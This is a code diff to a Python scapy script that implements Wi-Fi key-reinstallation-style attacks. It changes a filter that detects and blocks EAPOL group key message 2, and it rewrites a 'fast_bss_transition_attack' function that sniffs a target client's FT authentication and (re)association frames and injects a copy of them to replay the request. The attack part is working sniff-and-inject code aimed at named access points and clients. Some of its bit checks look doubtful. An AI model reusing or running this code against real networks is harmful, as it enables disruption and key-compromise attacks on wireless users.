@@ -1,6 +1,7 @@
 from scapy.all import (
     sniff, sendp, Dot11, EAPOL
 )
+from scapy.layers.dot11 import Dot11Auth, Dot11AssoReq, Dot11ReassoReq, Dot11AssoResp, Dot11ReassoResp, Dot11Elt, RadioTap
 from loguru import logger
 import threading
 import time
@@ -181,9 +182,9 @@ def block_group_key_message_2(interface, target_ap_mac):
             eapol_layer = pkt.getlayer(EAPOL)
             if eapol_layer.type == 3:  # Key
                 key_info = eapol_layer.key_info
-                if (key_info >> 4) & 1:  # Group message 2
-                    logger.info(f"Group Key Message 2 detected and blocked: {pkt.summary()}")
-                    return True
+                is_group = (key_info & 0x2000) != 0  # Group Key bit set (bit 13)
+                is_ack = (key_info & 0x0080) != 0  # ACK bit (bit 7)
+                return is_group and not is_ack
         return False
 
     # Sniff with a timeout to avoid infinite blocking
@@ -294,37 +295,50 @@ def block_group_key_message_2_delayed(interface, target_ap_mac):
 
 @logger.catch
 def fast_bss_transition_attack(interface, target_ap_mac, target_client_mac):
-    """Implements the Fast BSS Transition (FT) handshake attack."""
+    """
+    Perform Fast BSS Transition attack.
+    
+    Args:
+        interface (str): Network interface to use
+        target_ap_mac (str): Target AP MAC address
+        target_client_mac (str): Target client MAC address
+        
+    Returns:
+        bool: True if attack was successful, False otherwise
+    """
     logger.info(f"Starting Fast BSS Transition attack on AP {target_ap_mac}, Client: {target_client_mac}")
     
-    # --- Step 1: Capture FT Authentication and Reassociation ---
-    def is_ft_handshake(pkt):
-        if pkt.haslayer(Dot11):
+    try:
+        # Capture FT handshake
+        packets = sniff(iface=interface, timeout=30, lfilter=lambda x: (
+            x.haslayer(Dot11Auth) or 
+            x.haslayer(Dot11AssoReq) or 
+            x.haslayer(Dot11ReassoReq) or
+            x.haslayer(Dot11AssoResp) or 
+            x.haslayer(Dot11ReassoResp)
+        ))
+        
+        # Process captured packets
+        for pkt in packets:
+            # Check for FT authentication
             if pkt.haslayer(Dot11Auth):
-                return pkt.getlayer(Dot11Auth).algo == 2  # FT Authentication
-            elif pkt.haslayer(Dot11ReassoReq) or pkt.haslayer(Dot11ReassoResp):
-                return True
+                auth_layer = pkt.getlayer(Dot11Auth)
+                if auth_layer.algo == 2:  # FT Authentication
+                    logger.info("Detected FT authentication")
+                    
+            # Check for (re)association request
+            if pkt.haslayer(Dot11AssoReq) or pkt.haslayer(Dot11ReassoReq):
+                # Verify it's our target client
+                if pkt.addr2 == target_client_mac:
+                    logger.info("Detected FT (re)association request")
+                    # Create modified request with replay counter
+                    modified_req = pkt.copy()
+                    # Inject modified request
+                    sendp(modified_req, iface=interface, verbose=False)
+                    return True
+                    
         return False
-
-    handshake_packets = sniff(iface=interface, lfilter=is_ft_handshake, count=4, timeout=30)
-    if len(handshake_packets) < 4:
-        logger.error("Could not capture the complete FT handshake")
-        return False
-
-    # Find the reassociation request
-    reasso_req = None
-    for pkt in handshake_packets:
-        if pkt.haslayer(Dot11ReassoReq):
-            reasso_req = pkt
-            break
-
-    if reasso_req:
-        # Modify and replay the reassociation request
-        modified_req = reasso_req.copy()
-        # Increment replay counter (would be done in real attack)
-        send_packet(modified_req, interface)
-        logger.info("Replayed modified reassociation request")
-        return True
-    else:
-        logger.error("Could not find reassociation request in captured packets")
+        
+    except Exception as e:
+        logger.error(f"Error during Fast BSS Transition attack: {str(e)}")
         return False 
